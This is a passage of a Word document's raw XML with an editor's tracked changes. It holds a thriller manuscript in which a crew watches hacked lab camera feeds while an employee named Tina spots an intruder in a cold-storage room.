            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">confidently </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">through the lobby. </w:t>
      </w:r>
      <w:ins w:id="859" w:author="TextVet" w:date="2016-03-16T15:26:00Z">
        <w:r w:rsidR="00610ECD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>O</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="860" w:author="TextVet" w:date="2016-03-16T15:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00610ECD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>He o</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pen</w:t>
      </w:r>
      <w:ins w:id="861" w:author="TextVet" w:date="2016-03-16T15:26:00Z">
        <w:r w:rsidR="00610ECD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="862" w:author="TextVet" w:date="2016-03-16T15:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00610ECD">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the interior door</w:t>
      </w:r>
      <w:ins w:id="863" w:author="TextVet" w:date="2016-03-16T15:26:00Z">
        <w:r w:rsidR="00610ECD">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ins w:id="864" w:author="TextVet" w:date="2016-03-16T15:26:00Z">
        <w:r w:rsidR="00610ECD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>he</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="865" w:author="TextVet" w:date="2016-03-16T15:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00610ECD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> proceeded into the unlit hallway </w:t>
      </w:r>
      <w:ins w:id="866" w:author="TextVet" w:date="2016-03-16T15:26:00Z">
        <w:r w:rsidR="00610ECD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>like he owned the place</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="867" w:author="TextVet" w:date="2016-03-16T15:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00610ECD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>beyond</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quickly checked the lobby’s camera feed. The receptionist’s iPhone sat charging on her desk. “Guys. The girl. Christina,” Danny reminded them. “Moshen, where is she?”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replied, “I had her chasing spinnies into the main office.”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punched the corresponding URL into his browser. The video feed showed an office bullpen. The lights were off for the night, but the room was illuminated by screensavers and the power lights of office equipment. The desks were mostly messes of computers, papers, and laboratory apparatuses. White lab coats hung from the backs of curvy ergonomic chairs. Whiteboards filled with diagrams and equations lined the walls.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Christina looked up into the now-still camera, </w:t>
      </w:r>
      <w:ins w:id="868" w:author="TextVet" w:date="2016-03-16T15:29:00Z">
        <w:r w:rsidR="00517A56">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>arms akimbo,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="869" w:author="TextVet" w:date="2016-03-16T15:29:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00517A56">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>her hands on her hips and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> her lips pursed to one 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the darkened hallway beyond the bullpen, a shadow moved.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00142CE8" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="870" w:author="TextVet" w:date="2016-03-16T15:36:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>And, past</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="871" w:author="TextVet" w:date="2016-03-16T15:31:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00482484">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Danny realized that, w</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="872" w:author="TextVet" w:date="2016-03-16T15:36:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00142CE8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>hatever</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="873" w:author="TextVet" w:date="2016-03-16T15:36:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">all </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">his </w:t>
      </w:r>
      <w:del w:id="874" w:author="TextVet" w:date="2016-03-16T15:32:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00482484">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">own </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">personal </w:t>
      </w:r>
      <w:ins w:id="875" w:author="TextVet" w:date="2016-03-16T15:32:00Z">
        <w:r w:rsidR="00482484">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>agonie</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="876" w:author="TextVet" w:date="2016-03-16T15:32:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00482484">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>problem</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:del w:id="877" w:author="TextVet" w:date="2016-03-16T15:36:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00142CE8">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> might be</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:ins w:id="878" w:author="TextVet" w:date="2016-03-16T15:31:00Z">
        <w:r w:rsidR="00482484">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Danny knew</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="879" w:author="TextVet" w:date="2016-03-16T15:32:00Z">
        <w:r w:rsidR="00482484">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> that</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="880" w:author="TextVet" w:date="2016-03-16T15:31:00Z">
        <w:r w:rsidR="00482484">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the girl on the screen was </w:t>
      </w:r>
      <w:ins w:id="881" w:author="TextVet" w:date="2016-03-16T15:33:00Z">
        <w:r w:rsidR="00D35F00">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>heartbeats</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="882" w:author="TextVet" w:date="2016-03-16T15:33:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00D35F00">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">about to </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="883" w:author="TextVet" w:date="2016-03-16T15:30:00Z">
        <w:r w:rsidR="00D35F00">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="884" w:author="TextVet" w:date="2016-03-16T15:34:00Z">
        <w:r w:rsidR="00D35F00">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">away </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="885" w:author="TextVet" w:date="2016-03-16T15:30:00Z">
        <w:r w:rsidR="00D35F00">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>f</w:t>
        </w:r>
        <w:r w:rsidR="00482484">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="886" w:author="TextVet" w:date="2016-03-16T15:33:00Z">
        <w:r w:rsidR="00D35F00">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>om</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="887" w:author="TextVet" w:date="2016-03-16T15:30:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> the </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="888" w:author="TextVet" w:date="2016-03-16T15:35:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>fight</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="889" w:author="TextVet" w:date="2016-03-16T15:30:00Z">
        <w:r w:rsidR="00482484">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> of her life</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="890" w:author="TextVet" w:date="2016-03-16T15:30:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00482484">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>have much more pressing issues</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00F62BCE">
      <w:pPr>
        <w:pStyle w:val="ChapterNum"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:lastRenderedPageBreak/>
        <w:t>9</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In the periphery of her vision</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, something moved. Tina swore she saw a shadow glide across the adjoining hallway. If she hadn’t looked down from the camera at that exact moment, she would have missed it entirely. Light spilled out from the far end of the dim corridor. It had been completely dark just a minute before.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w:t>
      </w:r>
      <w:ins w:id="891" w:author="TextVet" w:date="2016-03-16T15:38:00Z">
        <w:r w:rsidR="00A54C44">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>edg</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="892" w:author="TextVet" w:date="2016-03-16T15:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A54C44">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>walk</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ed uncertainly toward the illumination. </w:t>
      </w:r>
      <w:ins w:id="893" w:author="TextVet" w:date="2016-03-16T15:38:00Z">
        <w:r w:rsidR="0053660E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>On</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="894" w:author="TextVet" w:date="2016-03-16T15:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0053660E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>When she</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> round</w:t>
      </w:r>
      <w:ins w:id="895" w:author="TextVet" w:date="2016-03-16T15:38:00Z">
        <w:r w:rsidR="0053660E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="896" w:author="TextVet" w:date="2016-03-16T15:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0053660E">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a bend, she saw that the light shone from the cold-storage room, where Tungsten kept samples of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bacteria in suspended animation. The hum of whirring HVAC machinery and the sound of clinking glassware grew as she approached.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peeked inside. The door to the deep-freeze unit hung open. Amidst the cold fog </w:t>
      </w:r>
      <w:ins w:id="897" w:author="TextVet" w:date="2016-03-16T15:39:00Z">
        <w:r w:rsidR="00E0150B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>deluging</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="898" w:author="TextVet" w:date="2016-03-16T15:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E0150B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>pouring out</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> onto the floor, Tina could see a pair of black sneakers under the door,</w:t>
      </w:r>
      <w:del w:id="899" w:author="TextVet" w:date="2016-03-16T15:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004C7B63">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could hear </w:t>
      </w:r>
      <w:ins w:id="900" w:author="TextVet" w:date="2016-03-16T15:40:00Z">
        <w:r w:rsidR="004C7B63">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>the</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="901" w:author="TextVet" w:date="2016-03-16T15:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004C7B63">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>someone</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> rifling </w:t>
      </w:r>
      <w:ins w:id="902" w:author="TextVet" w:date="2016-03-16T15:40:00Z">
        <w:r w:rsidR="004C7B63">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>of</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="903" w:author="TextVet" w:date="2016-03-16T15:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004C7B63">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>through</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> test tubes.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man’s gloved fingers wrapped around the edge of the steel door and pushed it shut.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wasn’t one of the scientists. Indeed, everything about his clothes and demeanor made it obvious that he didn’t belong anywhere near a laboratory.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saw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had left her iPhone charging at her desk. </w:t>
      </w:r>
      <w:ins w:id="904" w:author="TextVet" w:date="2016-03-16T15:41:00Z">
        <w:r w:rsidR="00F71E53">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>I</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="905" w:author="TextVet" w:date="2016-03-16T15:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F71E53">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Her first i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">nstinct </w:t>
      </w:r>
      <w:ins w:id="906" w:author="TextVet" w:date="2016-03-16T15:41:00Z">
        <w:r w:rsidR="00D2468A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>buzze</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="907" w:author="TextVet" w:date="2016-03-16T15:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D2468A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>tol</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
